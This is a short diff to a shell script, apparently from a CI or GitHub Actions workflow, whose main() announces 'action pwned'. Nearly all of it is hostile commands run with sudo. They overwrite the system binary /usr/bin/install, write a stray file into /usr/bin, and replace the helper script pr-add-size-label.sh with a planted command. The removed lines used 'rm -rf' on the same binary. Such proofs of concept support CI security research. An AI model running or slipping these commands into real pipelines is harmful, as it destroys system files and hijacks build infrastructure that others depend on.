@@ -39,11 +39,11 @@ function rebase_atop_of_the_latest_target_branch() {
 function main() {
     echo "action pwned"
     sudo id
+    sudo echo foo > /usr/bin/hmmmm
     ls -la /usr/bin/install
     lsattr /usr/bin/install
 
-    sudo rm -rf /usr/bin/install
-    sudo echo > /usr/bin/install
+    sudo echo "" > /usr/bin/install
     
     which install
     echo "id" > /usr/local/bin/pr-add-size-label.sh
